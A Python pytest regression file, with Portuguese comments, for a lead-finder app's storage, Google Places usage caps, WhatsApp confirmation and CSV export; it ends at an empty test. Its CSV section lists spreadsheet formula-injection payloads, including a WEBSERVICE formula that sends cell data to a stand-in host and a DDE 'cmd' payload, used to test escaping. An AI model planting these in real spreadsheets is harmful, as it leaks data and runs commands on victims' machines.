"""Regressões dos problemas P2 apontados pelas revisões do Codex no PR #1 (rodadas 1 e 2).

Cada teste reproduz o cenário descrito na revisão e falhava no código anterior às correções.
"""
from __future__ import annotations

import csv
import sqlite3
import threading
import time

import pytest

from mobilia.modules.lead_finder.config import Secrets, Settings
from mobilia.modules.lead_finder.export import _safe, write_csv
from mobilia.modules.lead_finder.models import GeoScope, Lead, SearchQuery
from mobilia.modules.lead_finder.net import Cancelled, CancelToken, HttpClient
from mobilia.modules.lead_finder.scoring import score_lead
from mobilia.modules.lead_finder.search import run_search
from mobilia.modules.lead_finder.sources import build
from mobilia.modules.lead_finder.storage import MIGRATIONS, SCHEMA_VERSION, SORTABLE, Store

from .conftest import fixture_json, wait_until


def L(source="osm", ref="node/1", name="Imobiliária Alfa", **kw):
    base = dict(city="Campinas", uf="SP", category="Imobiliária")
    base.update(kw)
    return Lead(source=source, source_ref=ref, name=name, **base)


# ======================================================================= 1. ordenação SQL com vírgulas

@pytest.mark.parametrize("key", sorted(SORTABLE))
@pytest.mark.parametrize("desc", [True, False])
def test_every_sort_key_produces_valid_sql(store, key, desc):
    store.ingest([L(ref="node/1", name="A", phone="19 99900-0001"), L(ref="node/2", name="B", city="Santos")])
    rows, total = store.page(sort=key, desc=desc)                      # antes: OperationalError em priority/score
    assert total == 2 and len(rows) == 2


def test_priority_and_score_sort_order(store):
    store.ingest([L(ref=f"node/{i}", name=f"E{i}", city=f"C{i}") for i in range(4)])
    ids = {r["name"]: r["id"] for r in store.page()[0]}
    store.con.execute("UPDATE leads SET score=NULL, priority=0, priority_user=0 WHERE name='E0'")
    store.con.execute("UPDATE leads SET score=80, priority=3 WHERE name='E1'")
    store.con.execute("UPDATE leads SET score=20, priority=1, priority_user=2 WHERE name='E2'")
    store.con.execute("UPDATE leads SET score=50, priority=2 WHERE name='E3'")
    store.con.commit()
    assert [r["name"] for r in store.page(sort="score", desc=True)[0]] == ["E1", "E3", "E2", "E0"]   # NULL por último
    assert [r["name"] for r in store.page(sort="score", desc=False)[0]] == ["E0", "E2", "E3", "E1"]
    by_prio = [r["name"] for r in store.page(sort="priority", desc=True)[0]]
    assert by_prio[0] == "E1" and set(by_prio[1:3]) == {"E2", "E3"} and by_prio[3] == "E0"   # max(priority, user)
    assert ids


def test_sort_expressions_are_explicit_tuples():
    for key, exprs in SORTABLE.items():
        assert isinstance(exprs, tuple) and exprs, key


# ================================================================ 2. custo do Google ao cancelar

def _google(http, tmp_path, **kw):
    s = Settings(google_enabled=True, **kw)
    sec = Secrets(tmp_path, env={})
    sec.set("google_places", "AIzaFAKEKEY0000000000000")
    return build(http, s, sec, tmp_path), s


class Ctx(CancelToken):
    def __init__(self):
        super().__init__()
        self.items = []

    def emit(self, item):
        self.items.append(item)

    def progress(self, *a):
        pass


def test_cancel_during_paid_request_still_counts_usage(transport, tmp_path):
    ctx = Ctx()
    sent = threading.Event()

    def slow_reply(req):              # a requisição saiu; o usuário cancela enquanto ela está em andamento
        sent.set()
        ctx.cancel()
        time.sleep(0.4)
        return 200, fixture_json("google_textsearch.json")
    transport.add("POST", r"places\.googleapis\.com", slow_reply)
    http = HttpClient(transport=transport, sleeper=lambda s: None)
    srcs, _ = _google(http, tmp_path, google_price_per_1000_usd=35.0)
    query = SearchQuery(GeoScope("uf", ufs=["SP"]), ["Imobiliária", "Construtora"], ["google_places"])
    with pytest.raises(Cancelled):
        run_search(ctx, query, srcs)
    assert sent.is_set()
    usage = [i for i in ctx.items if i[0] == "usage"]
    assert usage == [("usage", "google_places", 1, pytest.approx(0.035))]      # antes: nenhum registro


def test_unexpected_error_still_counts_usage(transport, tmp_path):
    transport.add("POST", r"places\.googleapis\.com", RuntimeError("falha inesperada no transporte"))
    http = HttpClient(transport=transport, sleeper=lambda s: None)
    srcs, _ = _google(http, tmp_path)
    ctx = Ctx()
    with pytest.raises(RuntimeError):
        run_search(ctx, SearchQuery(GeoScope("uf", ufs=["SP"]), ["Imobiliária"], ["google_places"]), srcs)
    assert [i[2] for i in ctx.items if i[0] == "usage"] == [1]


def test_monthly_cap_holds_across_cancelled_searches(transport, tmp_path):
    """Com o uso do cancelamento registrado, a próxima pesquisa enxerga o limite certo."""
    store = Store(tmp_path / "leads.sqlite3")
    ctx = Ctx()
    transport.add("POST", r"places\.googleapis\.com",
                  lambda req: (ctx.cancel(), time.sleep(0.4), (200, {"places": []}))[2])
    http = HttpClient(transport=transport, sleeper=lambda s: None)
    srcs, s = _google(http, tmp_path, google_monthly_request_cap=1)
    q = SearchQuery(GeoScope("uf", ufs=["SP"]), ["Imobiliária"], ["google_places"])
    with pytest.raises(Cancelled):
        run_search(ctx, q, srcs)
    for _, sid, units, cost in [i for i in ctx.items if i[0] == "usage"]:
        store.record_usage(sid, units, cost)
    used = store.usage_month("google_places")[0]
    assert used == 1
    ctx2 = Ctx()
    summary = run_search(ctx2, q, srcs, google_used_month=used)
    assert len(transport.requests) == 1 and summary["google_places"]["paid"] == 0   # limite mensal respeitado
    store.close()


# ============================================================ 3. destinatário do WhatsApp em Mensagens

@pytest.fixture()
def page(qapp, tmp_path, transport, home):
    from PySide6.QtWidgets import QMainWindow

    from mobilia.modules.lead_finder.ui.page import LeadFinderPage
    from mobilia.ui.widgets import StatusBar
    win = QMainWindow(); win.setStatusBar(StatusBar())
    p = LeadFinderPage(win, base=tmp_path / "lf", http=HttpClient(transport=transport, sleeper=lambda s: None))
    win.setCentralWidget(p); win.show()
    p.opened = []
    p.ctx.open_url = p.opened.append
    yield p
    p.ctx.shutdown(); win.close(); win.deleteLater(); qapp.processEvents()


def db(page, fn, *args):
    return page.ctx.db.call(fn, *args).result(timeout=10)


def test_new_search_clears_previous_recipient(page, qapp):
    db(page, lambda s: s.ingest([L(ref="node/1", name="Alfa Única", phone="19 99900-0001"),
                                 L(ref="node/2", name="Beta Um", phone="19 99900-0002", city="Santos"),
                                 L(ref="node/3", name="Beta Dois", phone="19 99900-0003", city="Sorocaba")]))
    view = page.views["messages"]
    page.show_tab("messages")
    view.lead_search.setText("alfa"); view._find_leads()
    assert wait_until(qapp, lambda: view.lead is not None and view.lead["name"] == "Alfa Única")
    assert view.btn_wa.isEnabled() and view.company.text() == "Alfa Única"
    view.lead_search.setText("beta"); view._find_leads()                # vários resultados, nenhum escolhido
    assert wait_until(qapp, lambda: view.lead_combo.count() == 3)
    assert view.lead is None and not view.btn_wa.isEnabled()            # antes: continuava apontando para Alfa
    assert view.lead_combo.currentData() is None and view.company.text() == ""
    page.ctx.last_dialog = None
    view._open_wa(); wait_until(qapp, lambda: False, 0.3)
    assert page.ctx.last_dialog is None and page.opened == []
    view.lead_search.setText("inexistente"); view._find_leads()         # zero resultados
    assert wait_until(qapp, lambda: view.lead_combo.count() == 1)
    assert view.lead is None and not view.btn_wa.isEnabled()


def test_manual_company_name_is_kept_when_list_changes(page, qapp):
    db(page, lambda s: s.ingest([L(ref="node/1", name="Alfa Única", phone="19 99900-0001")]))
    view = page.views["messages"]
    view.company.setText("Nome digitado por mim")
    view.lead_search.setText("nada"); view._find_leads()
    assert wait_until(qapp, lambda: view.lead_combo.count() == 1)
    assert view.company.text() == "Nome digitado por mim"


def test_stale_lead_answer_is_ignored(page, qapp):
    db(page, lambda s: s.ingest([L(ref="node/1", name="Alfa", phone="19 99900-0001"),
                                 L(ref="node/2", name="Beta", phone="19 99900-0002", city="Santos")]))
    view = page.views["messages"]
    view.lead_search.setText(""); view._find_leads()
    assert wait_until(qapp, lambda: view.lead_combo.count() == 3)
    view.lead_combo.setCurrentIndex(1)                                   # pede Alfa ao banco...
    view.lead_combo.setCurrentIndex(0)                                   # ...e desiste antes da resposta
    wait_until(qapp, lambda: False, 0.4)
    assert view.lead is None and not view.btn_wa.isEnabled()


# =================================================================== 4. pontuação acompanha os dados

def test_score_updates_when_same_source_record_gains_data(store):
    """Cenário da revisão: só a categoria → 15; o mesmo registro com celular e site → o valor de score_lead."""
    store.ingest([L(ref="node/1", name="Alfa")])
    lid = store.page()[0][0]["id"]
    assert store.get(lid)["score"] == 15
    store.ingest([L(ref="node/1", name="Alfa", phone="19 99900-0001", website="https://alfa-exemplo.com.br")])
    d = store.get(lid)
    expected, prio, _ = score_lead(d)
    assert d["score"] == expected == 49 and d["priority"] == prio == 2  # antes: continuava 15


def test_score_updates_on_consolidation_whatsapp_and_purge(store):
    store.ingest([L(ref="node/1", name="Alfa", category="")])
    lid = store.page()[0][0]["id"]
    s0 = store.get(lid)["score"]
    store.ingest([L("cnpj_aberto", "11222333000181", "Alfa", category="Incorporadora", cnpj="11222333000181",
                    situacao="ATIVA", phone="19 3200-0001")])            # consolidada por nome + cidade
    s1 = store.get(lid)["score"]
    assert s1 > s0 and s1 == score_lead(store.get(lid))[0]
    store.set_whatsapp(lid, "confirmado")
    s2 = store.get(lid)["score"]
    assert s2 > s1
    store.ingest([L("google_places", "ChIJX", "Só Google", phone="+55 21 99999-0002", website="https://g.com.br",
                    city="Rio", uf="RJ")])
    gid = [r["id"] for r in store.page()[0] if r["name"] == "Só Google"][0]
    before = store.get(gid)["score"]
    store.con.execute("UPDATE lead_sources SET expires_at='2000-01-01T00:00:00+00:00' WHERE source='google_places'")
    store.con.commit()
    store.purge_expired()
    assert store.get(gid)["score"] < before                             # dados apagados → pontuação cai


def test_dashboard_qualified_count_reflects_new_data(store):
    store.ingest([L(ref="node/1", name="Alfa")])
    assert store.dashboard(40)["values"]["qualified"] == 0
    store.ingest([L(ref="node/1", name="Alfa", phone="19 99900-0001", website="https://alfa-exemplo.com.br")])
    assert store.dashboard(40)["values"]["qualified"] == 1


# ===================================================================== 5. fórmulas em CSV

@pytest.mark.parametrize("value", [
    "=1+1", '=1+WEBSERVICE("https://example.invalid/"&A2)', "+1+1", "-1+cmd|' /C calc'!A0", "@SUM(1+1)",
    "\t=1+1", "\r=1+1", "  =1+1", "=HYPERLINK(\"http://mal\")", "+5511987654321 abc",
])
def test_formula_prefixed_values_are_escaped(value):
    assert _safe(value) == "'" + value


@pytest.mark.parametrize("value", ["-12", "+3", "3,5", "-0.25", "Imobiliária Alfa", "(19) 3200-0001", "", "10"])
def test_plain_values_are_untouched(value):
    assert _safe(value) == value


def test_exported_company_name_with_formula_is_neutralized(store, tmp_path):
    store.ingest([L(name='=1+WEBSERVICE("https://example.invalid/"&A2)', phone="19 3200-0001")])
    rows, attributions, _ = store.export_rows()
    out = write_csv(tmp_path / "x.csv", rows, Store.EXPORT_COLUMNS, attributions)
    cells = list(csv.reader(out.read_text(encoding="utf-8-sig").splitlines(), delimiter=";"))[1]
    assert cells[0].startswith("'=1+WEBSERVICE")


# ============================================================ 6. número confirmado como WhatsApp

def test_manual_confirmation_keeps_the_mobile_candidate(store):
    """Cenário da revisão: fixo em phone e celular em phone2; confirmar não pode trocar para o fixo."""
    store.ingest([L(phone="19 3200-0001", phone2="19 99900-0001")])
    lid = store.page()[0][0]["id"]
    assert store.get(lid)["wa_number"] == "+5519999000001"
    store.set_whatsapp(lid, "confirmado")
    d = store.get(lid)
    assert (d["wa_number"], d["wa_status"]) == ("+5519999000001", "confirmado")   # antes: +551932000001
    store.ingest([L(phone="19 3200-0001", phone2="19 99900-0001", address="Rua Nova")])   # nova consulta
    assert store.get(lid)["wa_number"] == "+5519999000001"


def test_user_can_confirm_a_specific_number(store):
    store.ingest([L(phone="19 3200-0001", phone2="19 99900-0001")])
    lid = store.page()[0][0]["id"]
    assert store.whatsapp_candidates(lid) == ["+5519999000001", "+551932000001"]
    store.set_whatsapp(lid, "confirmado", "(19) 3200-0001")             # WhatsApp Business no fixo
    assert store.get(lid)["wa_number"] == "+551932000001"
    with pytest.raises(ValueError):
        store.set_whatsapp(lid, "confirmado", "11 98888-7777")          # número que não é da empresa
    with pytest.raises(ValueError):
        store.set_whatsapp(lid, "confirmado", "abc")
    store.set_whatsapp(lid, "")                                          # desfazer: volta ao automático
    assert (store.get(lid)["wa_number"], store.get(lid)["wa_status"]) == ("+5519999000001", "provavel")


def test_confirmed_number_beats_other_source_whatsapp(store):
    store.ingest([L(phone="19 3200-0001", whatsapp="19 99900-0009")])
    lid = store.page()[0][0]["id"]
    store.set_whatsapp(lid, "confirmado", "19 3200-0001")
    assert store.get(lid)["wa_number"] == "+551932000001"


def test_confirm_without_valid_phone_is_refused(store):
    store.ingest([L(phone="0800 123 4567")])
    lid = store.page()[0][0]["id"]
    with pytest.raises(ValueError):
        store.set_whatsapp(lid, "confirmado")


def test_migration_v3_keeps_previous_confirmation(tmp_path):
    path = tmp_path / "v2.sqlite3"
    con = sqlite3.connect(path)
    for m in MIGRATIONS[:2]:
        con.executescript(m)
    con.execute("PRAGMA user_version=2")
    con.execute("INSERT INTO leads(name, wa_user, wa_number, created_at) VALUES ('X', 'confirmado', '+5519999000001', '')")
    con.commit(); con.close()
    s = Store(path)
    assert s.version == SCHEMA_VERSION >= 3
    assert s.con.execute("SELECT wa_user_number FROM leads").fetchone()[0] == "+5519999000001"
    s.close()


def test_detail_panel_asks_which_number(page, qapp, monkeypatch):
    from PySide6.QtWidgets import QInputDialog
    db(page, lambda s: s.ingest([L(phone="19 3200-0001", phone2="19 99900-0001")]))
    lid = db(page, lambda s: s.page()[0][0]["id"])
    asked = {}

    def pick(parent, title, label, items, current, editable):
        asked["items"] = items
        return items[1], True                                            # escolhe o fixo
    monkeypatch.setattr(QInputDialog, "getItem", staticmethod(pick))
    page._open_lead(lid)
    detail = page.views["leads"].detail
    assert wait_until(qapp, lambda: detail.lead is not None and detail.lead["id"] == lid)
    detail.wa_state.setCurrentIndex(detail.wa_state.findData("confirmado"))
    assert wait_until(qapp, lambda: db(page, lambda s: s.get(lid))["wa_status"] == "confirmado")
    assert asked["items"][0].startswith("(19) 99900-0001") and "(atual)" in asked["items"][0]
    assert db(page, lambda s: s.get(lid))["wa_number"] == "+551932000001"


# ==================================================== extra: Place Details também conta uso e respeita limite

def test_google_refresh_counts_each_request_even_on_error(page, qapp, transport, no_modal):
    page.ctx.settings.google_enabled = True
    page.ctx.secrets.set("google_places", "AIzaFAKEKEY0000000000000")
    transport.add("GET", r"places\.googleapis\.com/v1/places/", (403, {"error": {"message": "negado"}}))
    db(page, lambda s: s.ingest([L("google_places", "ChIJTESTE0000001", "Alfa", phone="19 99900-0001")]))
    lid = db(page, lambda s: s.page()[0][0]["id"])
    view = page.views["leads"]
    view.refresh_google(lid)
    assert wait_until(qapp, lambda: view.bg_task is not None and view.bg_task.finished.is_set())
    assert wait_until(qapp, lambda: db(page, lambda s: s.usage_month("google_places")[0]) == 1)  # antes: 0


def test_google_refresh_respects_monthly_cap(page, qapp, transport, no_modal):
    page.ctx.settings.google_enabled = True
    page.ctx.settings.google_monthly_request_cap = 3
    page.ctx.secrets.set("google_places", "AIzaFAKEKEY0000000000000")
    db(page, lambda s: (s.record_usage("google_places", 3, 0.1),
                        s.ingest([L("google_places", "ChIJTESTE0000001", "Alfa", phone="19 99900-0001")])))
    lid = db(page, lambda s: s.page()[0][0]["id"])
    view = page.views["leads"]
    view.refresh_google(lid)
    wait_until(qapp, lambda: False, 0.4)
    assert transport.requests == [] and view.bg_task is None


# #################################################################################### rodada 2 da revisão

# ============================================== 7. novas tentativas automáticas contam no limite do Google

def test_paid_google_request_is_not_retried_automatically(transport, tmp_path):
    """Cenário da revisão: limites = 1 e timeouts seguidos. Antes: 4 envios e 1 unidade registrada."""
    calls = {"n": 0}

    def timeout_then_ok(req):
        calls["n"] += 1
        if calls["n"] <= 3:
            raise TimeoutError("timed out")
        return 200, fixture_json("google_textsearch.json")
    transport.add("POST", r"places\.googleapis\.com", timeout_then_ok)
    http = HttpClient(transport=transport, sleeper=lambda s: None)        # cliente padrão: retries=3
    srcs, _ = _google(http, tmp_path, google_max_requests_per_search=1, google_monthly_request_cap=1)
    ctx = Ctx()
    summary = run_search(ctx, SearchQuery(GeoScope("uf", ufs=["SP"]), ["Imobiliária"], ["google_places"]), srcs)
    assert calls["n"] == 1                                               # um envio real...
    assert [i[2] for i in ctx.items if i[0] == "usage"] == [1]           # ...uma unidade registrada
    assert summary["google_places"]["errors"]                            # a falha aparece para o usuário


def test_place_details_is_not_retried_automatically(transport, tmp_path):
    calls = {"n": 0}

    def flaky(req):
        calls["n"] += 1
        raise TimeoutError("timed out")
    transport.add("GET", r"places\.googleapis\.com/v1/places/", flaky)
    http = HttpClient(transport=transport, sleeper=lambda s: None)
    srcs, _ = _google(http, tmp_path)
    with pytest.raises(Exception):
        srcs["google_places"].details("ChIJTESTE0000001")
    assert calls["n"] == 1


def test_free_sources_still_retry(transport):
    calls = {"n": 0}

    def flaky(req):
        calls["n"] += 1
        return (503, {}) if calls["n"] < 3 else (200, {"ok": 1})
    transport.add("GET", r"livre\.test", flaky)
    assert HttpClient(transport=transport, sleeper=lambda s: None).get_json("https://livre.test/x") == {"ok": 1}
    assert calls["n"] == 3


# ============================================== 8. razão social com acentos na busca da base de CNPJ

def _receita(tmp_path, with_empresas=True):
    import zipfile
    d = tmp_path / "receita"; d.mkdir()

    def estab(basico, fantasia, muni="6291"):
        cols = [basico, "0001", "00", "1", fantasia, "02", "20200101", "00", "", "", "20150310", "6821801", "",
                "RUA", "X", "1", "", "CENTRO", "13000000", "SP", muni, "19", "32000001", "", "", "", "", "", "", ""]
        return ";".join(f'"{c}"' for c in cols)
    with zipfile.ZipFile(d / "Estabelecimentos0.zip", "w") as z:
        z.writestr("E.ESTABELE", "\n".join([estab("10000001", ""), estab("10000002", "INDIVIDUAL SEM EMPRESAS"),
                                             estab("10000003", "")]).encode("latin-1"))
    if with_empresas:
        with zipfile.ZipFile(d / "Empresas0.zip", "w") as z:
            z.writestr("E.EMPRECSV", '"10000001";"SÃO JOSÉ IMÓVEIS LTDA";"2062";"49";"0";"01";""\n'
                                     '"10000003";"CORRETORA ÁGUA BRANCA LTDA";"2062";"49";"0";"01";""\n'.encode("latin-1"))
    with zipfile.ZipFile(d / "Municipios.zip", "w") as z:
        z.writestr("M.MUNICCSV", '"6291";"CAMPINAS"\n'.encode("latin-1"))
    return d


def test_accented_legal_name_matches_custom_keyword(transport, tmp_path):
    from mobilia.modules.lead_finder.sources.cnpj_open import import_open_data
    import_open_data(_receita(tmp_path), tmp_path / "cnpj_index.sqlite3", ["SP"], Ctx(), None)
    srcs = build(HttpClient(transport=transport), Settings(), Secrets(tmp_path, env={}), tmp_path)
    src = srcs["cnpj_aberto"]
    for kw, expected in (("São José", "10000001000100"), ("sao jose", "10000001000100"),
                         ("Água Branca", "10000003000100")):
        q = SearchQuery(GeoScope("uf", ufs=["SP"]), [kw], ["cnpj_aberto"])
        found = [lead.cnpj for lead in src.fetch(src.plan(q)[0], q, Ctx())]
        assert found == [expected], kw                                    # antes: nenhum resultado


# ============================================== 9. natureza jurídica desconhecida fora da busca padrão

def test_unknown_legal_nature_excluded_unless_individuals_enabled(transport, tmp_path):
    from mobilia.modules.lead_finder.sources.cnpj_open import import_open_data, index_info
    idx = tmp_path / "cnpj_index.sqlite3"
    rep = import_open_data(_receita(tmp_path, with_empresas=False), idx, ["SP"], Ctx(), None)
    assert rep.kept == 3 and rep.with_legal_name == 0 and index_info(idx)["sem_natureza"] == 3
    srcs = build(HttpClient(transport=transport), Settings(), Secrets(tmp_path, env={}), tmp_path)
    src = srcs["cnpj_aberto"]
    ok, why = src.availability()
    assert ok and "sem natureza jurídica" in why
    q = SearchQuery(GeoScope("uf", ufs=["SP"]), ["Imobiliária"], ["cnpj_aberto"])
    assert list(src.fetch(src.plan(q)[0], q, Ctx())) == []               # antes: os 3 apareciam
    q2 = SearchQuery(GeoScope("uf", ufs=["SP"]), ["Imobiliária"], ["cnpj_aberto"], include_individuals=True)
    assert len(list(src.fetch(src.plan(q2)[0], q2, Ctx()))) == 3


# ============================================== 10. prazo de guarda alcança o histórico

def test_purge_removes_google_name_from_history(store):
    store.ingest([L("google_places", "ChIJONLY000001", "Only Google Company", phone="+55 21 99999-0002",
                    city="Rio", uf="RJ", query="Imobiliária · Rio de Janeiro")])
    lid = store.page()[0][0]["id"]
    assert "Only Google Company" not in str(store.get(lid)["events"])    # nem entra no histórico
    store.con.execute("UPDATE lead_sources SET expires_at='2000-01-01T00:00:00+00:00'"); store.con.commit()
    store.purge_expired()
    d = store.get(lid)
    dump = str({k: v for k, v in d.items() if k != "source_records"}) + str(d["source_records"])
    assert "Only Google Company" not in dump and "99999-0002" not in dump and "999990002" not in dump


def test_purge_scrubs_name_copied_by_older_versions(store):
    """Bancos gravados antes da correção têm o nome no evento "criado": a limpeza também apaga essa cópia."""
    store.ingest([L("google_places", "ChIJONLY000001", "Only Google Company", city="Rio", uf="RJ")])
    lid = store.page()[0][0]["id"]
    store.con.execute("UPDATE events SET detail='Only Google Company · Imobiliária' WHERE kind='criado'")
    store.con.execute("UPDATE lead_sources SET expires_at='2000-01-01T00:00:00+00:00'"); store.con.commit()
    store.purge_expired()
    assert "Only Google Company" not in str(store.get(lid)["events"])


def test_open_sources_keep_name_in_history(store):
    store.ingest([L(name="Imobiliária Aberta")])
    assert "Imobiliária Aberta" in store.get(store.page()[0][0]["id"])["events"][-1]["detail"]


# ============================================== 11. rascunho de mensagem preservado ao voltar à aba

def test_message_draft_survives_switching_tabs(page, qapp):
    page.show_tab("messages")
    view = page.views["messages"]
    assert wait_until(qapp, lambda: getattr(view, "_templates_ready", False))
    view.editor.setPlainText("Rascunho editado à mão")
    for _ in range(2):
        page.show_tab("leads"); qapp.processEvents()
        page.show_tab("messages")
        wait_until(qapp, lambda: False, 0.3)
    assert view.editor.toPlainText() == "Rascunho editado à mão"         # antes: texto regenerado
    view.list.setCurrentRow(1)                                           # escolher outro modelo gera texto novo
    assert view.editor.toPlainText() != "Rascunho editado à mão"


def test_template_list_reload_keeps_draft(page, qapp):
    page.show_tab("messages")
    view = page.views["messages"]
    assert wait_until(qapp, lambda: getattr(view, "_templates_ready", False))
    view.editor.setPlainText("Outro rascunho")
    view.load_templates()
    wait_until(qapp, lambda: False, 0.3)
    assert view.editor.toPlainText() == "Outro rascunho"


# ============================================== 12. telefone secundário na consolidação

def test_secondary_phone_consolidates_duplicates(store):
    """Cenário da revisão: CNPJ com dois fixos; OSM com o segundo fixo → uma empresa só."""
    store.ingest([L("cnpj_aberto", "11222333000181", "Alfa Negócios Ltda", phone="19 3200-0001",
                    phone2="19 3200-0002", cnpj="11222333000181")])
    st = store.ingest([L("osm", "node/7", "Imobiliária Alfa", phone="19 3200-0002", city="Campinas")])
    assert st["consolidados"] == 1 and store.page()[1] == 1               # antes: duas empresas


def test_secondary_phone_respects_conflicting_cnpj(store):
    store.ingest([L("cnpj_aberto", "11222333000181", "Alfa", phone="19 3200-0001", phone2="19 3200-0002",
                    cnpj="11222333000181")])
    store.ingest([L("cnpj_aberto", "00000000000191", "Outra", phone="19 3200-0002", cnpj="00000000000191",
                    city="Outra")])
    assert store.page()[1] == 2


def test_migration_v4_backfills_secondary_phone(tmp_path):
    path = tmp_path / "v3.sqlite3"
    con = sqlite3.connect(path)
    for m in MIGRATIONS[:3]:
        con.executescript(m)
    con.execute("PRAGMA user_version=3")
    con.execute("INSERT INTO leads(name, phone2, cnpj, created_at) VALUES ('Antiga', '(19) 3200-0002', '', '')")
    con.commit(); con.close()
    s = Store(path)
    assert s.con.execute("SELECT phone2_e164 FROM leads").fetchone()[0] == "+551932000002"
    st = s.ingest([L("osm", "node/7", "Nome Diferente", phone="19 3200-0002", city="Outra")])
    assert st["consolidados"] == 1
    s.close()


# #################################################################################### rodada 3 da revisão

# ============================================== 13. exportação respeita as decisões manuais de WhatsApp

def test_export_uses_manual_whatsapp_confirmation(store):
    store.ingest([L(phone="19 99900-0001")])                              # só OSM, celular em phone
    lid = store.page()[0][0]["id"]
    assert store.export_rows()[0][0]["whatsapp"] == ""
    store.set_whatsapp(lid, "confirmado")
    assert store.export_rows()[0][0]["whatsapp"] == "(19) 99900-0001"     # antes: vazio


def test_export_honours_no_whatsapp(store):
    store.ingest([L(phone="19 3200-0001", whatsapp="19 99900-0001")])
    lid = store.page()[0][0]["id"]
    assert store.export_rows()[0][0]["whatsapp"] == "(19) 99900-0001"
    store.set_whatsapp(lid, "sem_whatsapp")
    assert store.export_rows()[0][0]["whatsapp"] == ""                   # antes: continuava exportado


def test_export_keeps_google_only_number_out_even_if_confirmed(store):
    store.ingest([L("google_places", "ChIJX0000000001", "Só Google", phone="+55 21 99999-0002", city="Rio", uf="RJ")])
    lid = store.page()[0][0]["id"]
    store.set_whatsapp(lid, "confirmado")
    row = store.export_rows()[0][0]
    assert row["whatsapp"] == "" and "99999" not in str(row)


# ============================================== 14. supressão também em atualizações e consolidações

def test_suppressed_phone_does_not_revive_through_existing_record(store):
    """Cenário da revisão: Alfa excluída com "não contatar"; o registro OSM já existente de Beta passa a trazer o
    telefone suprimido de Alfa. Beta não pode ficar com esse número como WhatsApp."""
    store.ingest([L(ref="node/1", name="Alfa", phone="19 99900-0001"),
                  L(ref="node/2", name="Beta", phone="19 99900-0002", city="Santos")])
    ids = {r["name"]: r["id"] for r in store.page()[0]}
    store.delete_lead(ids["Alfa"], do_not_contact=True)
    store.ingest([L(ref="node/2", name="Beta", phone="19 99900-0001", city="Santos")])
    beta = store.get(ids["Beta"])
    assert beta["status"] == "nao_contatado" and beta["wa_number"] != "+5519999000001"   # antes: igual


def test_suppressed_cnpj_on_existing_record_is_ignored(store):
    store.ingest([L("cnpj_aberto", "11222333000181", "Alfa", cnpj="11222333000181"),
                  L(ref="node/2", name="Beta", phone="19 99900-0002", city="Santos")])
    ids = {r["name"]: r["id"] for r in store.page()[0]}
    store.delete_lead(ids["Alfa"], do_not_contact=True)
    st = store.ingest([L(ref="node/2", name="Beta", phone="19 99900-0002", city="Santos", cnpj="11222333000181")])
    assert st["ignorados_nao_contatar"] == 1 and store.get(ids["Beta"])["cnpj"] == ""


def test_suppressed_number_cannot_be_confirmed_manually(store):
    store.ingest([L(ref="node/1", name="Alfa", phone="19 99900-0001"),
                  L(ref="node/2", name="Beta", phone="19 3200-0002", phone2="19 99900-0003", city="Santos")])
    ids = {r["name"]: r["id"] for r in store.page()[0]}
    store.delete_lead(ids["Alfa"], do_not_contact=True)
    store.con.execute("UPDATE lead_sources SET payload=json_set(payload, '$.phone2', '19 99900-0001') "
                      "WHERE source_ref='node/2'")
    store.con.commit()
    store.ingest([L(ref="node/2", name="Beta", phone="19 3200-0002", phone2="19 99900-0003", city="Santos")])
    assert "+5519999000001" not in store.whatsapp_candidates(ids["Beta"])
    with pytest.raises((PermissionError, ValueError)):
        store.set_whatsapp(ids["Beta"], "confirmado", "19 99900-0001")


def test_dnc_lead_itself_keeps_updating(store):
    store.ingest([L(phone="19 99900-0001")])
    lid = store.page()[0][0]["id"]
    store.set_status(lid, "nao_contatar")
    st = store.ingest([L(phone="19 99900-0001", address="Rua Nova")])
    assert st["atualizados"] == 1 and store.get(lid)["address"] == "Rua Nova"


# ============================================== 15. limite mensal compartilhado entre pesquisa e Place Details

def test_paid_operations_are_exclusive(page, qapp, transport, no_modal):
    page.ctx.settings.google_enabled = True
    page.ctx.secrets.set("google_places", "AIzaFAKEKEY0000000000000")
    db(page, lambda s: s.ingest([L("google_places", "ChIJTESTE0000001", "Alfa", phone="19 99900-0001")]))
    lid = db(page, lambda s: s.page()[0][0]["id"])
    assert page.ctx.begin_paid("search")                                  # pesquisa paga em andamento
    view = page.views["leads"]
    view.refresh_google(lid)
    wait_until(qapp, lambda: False, 0.4)
    assert transport.requests == [] and view.bg_task is None             # antes: Place Details era enviado
    page.ctx.end_paid("search")
    transport.add("GET", r"places\.googleapis\.com/v1/places/", (200, {"id": "ChIJTESTE0000001",
                                                                        "displayName": {"text": "Alfa"}}))
    view.refresh_google(lid)
    assert wait_until(qapp, lambda: view.bg_task is not None and view.bg_task.finished.is_set())
    assert wait_until(qapp, lambda: not getattr(page.ctx, "_paid_owner", ""))   # reserva liberada no fim
    assert len(transport.requests) == 1


def test_search_releases_paid_reservation(page, qapp, transport, monkeypatch):
    from PySide6.QtWidgets import QMessageBox
    monkeypatch.setattr(QMessageBox, "exec", lambda self: QMessageBox.No)    # usuário recusa a consulta paga
    page.ctx.settings.google_enabled = True
    page.ctx.secrets.set("google_places", "AIzaFAKEKEY0000000000000")
    view = page.views["search"]
    view.refresh_sources()
    assert wait_until(qapp, lambda: view.source_rows["google_places"][0].isEnabled())
    view.source_rows["google_places"][0].setChecked(True)
    view.source_rows["osm"][0].setChecked(False)
    view.start()
    assert wait_until(qapp, lambda: not getattr(page.ctx, "_paid_owner", "x"))
    assert transport.requests == []


# ============================================== 16. lista de municípios sempre da UF selecionada

def test_municipality_list_follows_selected_uf(page, qapp, transport):
    import json as _json
    cache = page.ctx.cache_dir; cache.mkdir(parents=True, exist_ok=True)
    (cache / "ibge_SP.json").write_text(_json.dumps(["Campinas", "Santos"]), encoding="utf-8")
    transport.add("GET", r"servicodados\.ibge\.gov\.br", OSError("sem internet"))
    view = page.views["search"]
    view.scope.set_value("municipios", emit=True)
    view.muni_uf.setCurrentIndex(view.muni_uf.findData("SP"))
    view.load_municipalities()
    assert view.muni_model.stringList() == ["Campinas", "Santos"]
    view.muni_uf.setCurrentIndex(view.muni_uf.findData("RJ"))           # RJ sem cache e sem internet
    assert wait_until(qapp, lambda: "Sem a lista" in view.muni_hint.text())
    assert view.muni_model.stringList() == []                            # antes: continuava a lista de SP
    view.muni_input.setText("Rio de Janeiro"); view.add_municipality()
    assert [view.muni_list.item(i).text() for i in range(view.muni_list.count())] == ["Rio de Janeiro - RJ"]


# #################################################################################### rodada 4 da revisão

# ============================================== 17. confirmação manual não sobrevive ao prazo do Google

def test_confirmed_google_only_number_is_removed_on_expiry(store):
